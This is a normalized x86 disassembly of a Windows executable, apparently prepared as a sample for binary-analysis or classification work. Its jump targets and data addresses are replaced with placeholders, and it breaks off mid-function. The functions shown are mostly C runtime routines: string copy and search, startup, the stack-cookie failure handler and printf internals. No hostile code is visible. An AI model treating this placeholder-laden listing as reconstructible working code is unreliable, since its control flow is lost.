test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
sub ecx 0x1
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
sub ebx 0x1
jne r-xdata
sub ebx 0x1
jne r-xdata
xor eax eax
mov [ edi ] al
add edi 0x1
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
sub ecx 0x1
jne r-xdata
add edi 0x4
xor eax eax
sub ecx 0x1
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_40349f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40348f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_403484
pop ecx
sub_4034c0
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
push 0x7
pop ecx
xor eax eax
lea edi [ ebp - 0x1c ]
[ edi ]
pop edi
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_405072
mov [ eax ] 0x16
call sub_405020
or eax 0xffffffff
leave
retn
push esi
call sub_405450
pop ecx
mov ecx 0x7fffffff
mov [ ebp - 0x14 ] 0x49
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] ecx
cmp eax ecx
ja r-xdata
push [ ebp + 0x14 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
leave
retn
mov [ ebp - 0x1c ] eax
sub_40352e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push sub_405592
call sub_4034c0
add esp 0x10
pop esi
pop ebp
retn
sub_4035ac
push 0x58
push r--data
call sub_403d50
lea eax [ ebp - 0x68 ]
push eax
call [ GetStartupInfoW@IAT ]
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
push esi
push esi
push 0x1
push esi
call [ HeapSetInformation@IAT ]
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_40746a
test eax eax
jne r-xdata
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_40688f
test eax eax
jne r-xdata
push 0x1c
call sub_403583
xor ecx ecx
cmp [ eax + __coff_header ] esi
setne cl
mov [ ebp - 0x1c ] ecx
call sub_40741e
mov [ ebp - 0x4 ] esi
call sub_4071d9
test eax eax
jns r-xdata
push 0x10
call sub_403583
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_407142
mov [ rw-data ] eax
call sub_407087
test eax eax
jns r-xdata
push 0x1b
call sub_403d29
call sub_406e11
test eax eax
jns r-xdata
push 0x8
call sub_403d29
push 0x1
call sub_403b08
pop ecx
cmp eax esi
je r-xdata
push 0x9
call sub_403d29
call sub_406db2
test [ ebp - 0x3c ] 0x1
je r-xdata
push eax
call sub_403d29
push 0xa
pop ecx
movzx ecx [ ebp - 0x38 ]
jmp r-xdata
call sub_403d0b
jmp r-xdata
push eax
call sub_403cdf
push ecx
push eax
push esi
push __dos_header
call sub_403040
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_403d95
retn
sub_40372e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_4075e0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_403484
pop ecx
sub_403772
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_407637
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_4076da
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_407612
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_407702
int3
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] r--data
call sub_407523
push sub_40c1bf
mov [ rw-data ] esi
call sub_40320b
pop ecx
sub_4037f2
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_40774e
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_40774e
pop ecx
sub_4038f8
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_407637
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_40393d
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_407756
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_403989
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4077d8
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_4039d7
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_407885
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_403a29
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_405072
mov [ eax ] 0x16
call sub_405020
or eax 0xffffffff
pop ebp
retn
sub_403a5c
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_403ab1
mov edi edi
push esi
call sub_406596
mov esi eax
push esi
call sub_4076cb
push esi
call sub_404e96
push esi
call sub_407cfe
push esi
call sub_407cef
push esi
call sub_407aea
push esi
call sub_407ad9
add esp 0x18
pop esi
retn
sub_403ae4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_403b08
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_407d0d
push r--data
push r--data
call sub_403ae4
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_407dc0
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_407444
call sub_40320b
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_407dc0
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_403b9f
push 0x20
push r--data
call sub_403d50
push 0x8
call sub_407a6d
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_403cca
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_403d95
retn
mov [ rw-data ] 0x1
push 0x8
call sub_407994
pop ecx
push [ ebp + 0x8 ]
call sub_403a87
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_406596
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_406596
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_403d50
push sub_403db0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_403db0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4030d9
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4030d9
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_407fbb
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_407f72
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_4030d9
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4030d9
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_407fa2
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_407fbb
mov eax [ ebp + 0xc ]
push rw-data
call sub_407dc0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_4030d9
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_407f89
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4030d9
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ rw-data ]
add esp 0x8
sub_403f56
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_40400e
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_408b66
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_405072
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_405072
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_4089b1
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_40883e
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
mov [ esi + 0x4 ] ecx
cmp edi ebx
jle r-xdata
push [ ebp + 0xc ]
call sub_40895b
pop ecx
test eax eax
jne r-xdata
call sub_4089b1
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_40883e
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_408912
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_408057
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_404172
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_406746
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_409530
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_408daf
mov [ esi + 0x4 ] eax
sub_4041f9
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_40400e
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_40422c
mov edi edi
push ebp
mov ebp esp
push ecx
test [ ebx + 0xc ] 0x40
push esi
mov esi eax
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
je r-xdata
and [ edi ] 0x0
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov al [ eax ]
dec [ ebp + 0xc ]
mov ecx ebx
call sub_4041f9
inc [ ebp + 0x8 ]
cmp [ esi ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp [ edi ] 0x2a
jne r-xdata
pop esi
leave
retn
cmp [ edi ] 0x0
jne r-xdata
mov ecx ebx
mov al 0x3f
call sub_4041f9
sub_40428e
mov edi edi
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x24c ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x23c ] eax
call sub_404172
call sub_405072
mov [ ebp - 0x26c ] eax
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_405072
mov [ eax ] 0x16
call sub_405020
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_408b66
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x248 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4030d9
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
xor esi esi
mov [ ebp - 0x240 ] ebx
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x240 ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x274 ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x274 ]
mov edi [ ebp - 0x21c ]
mov dl al
jmp r-xdata
sub_404ea5
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_409820
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_40774e
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_4030d9
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_40774e
pop ecx
sub_404fce
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_404ea5
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_404ff3
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_404fce
int3
pop ebp
jmp eax
sub_405030
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_405098
mov edi edi
push ebp
mov ebp esp
push esi
call sub_405085
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_405030
pop ecx
mov esi eax
call sub_405072
mov [ eax ] esi
pop esi
pop ebp
retn
sub_4050bb
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
call sub_404172
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
test eax eax
je r-xdata
test esi esi
